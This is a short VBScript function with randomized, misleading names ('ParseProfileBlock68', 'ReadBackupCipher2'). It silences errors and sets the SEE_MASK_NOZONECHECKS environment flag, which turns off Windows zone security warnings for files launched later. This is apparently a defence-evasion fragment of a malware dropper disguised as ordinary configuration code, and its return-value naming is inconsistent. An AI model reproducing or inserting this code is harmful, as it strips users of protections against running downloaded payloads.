Function ParseProfileBlock68()
On Error Resume Next
  Dim strConfigData15,blnIdle97,strBackupSlice90
  Set strConfigData15=CreateObject("WScript.Shell")
  blnIdle97=strConfigData15.ExpandEnvironmentStrings("%TEMP%")
  strBackupSlice90=strConfigData15.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnIdle97)>0 And Len(strBackupSlice90)>0 Then
    strConfigData15.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ReadBackupCipher2=1
    Exit Function
  End If
  ReadBackupCipher2=0
End Function

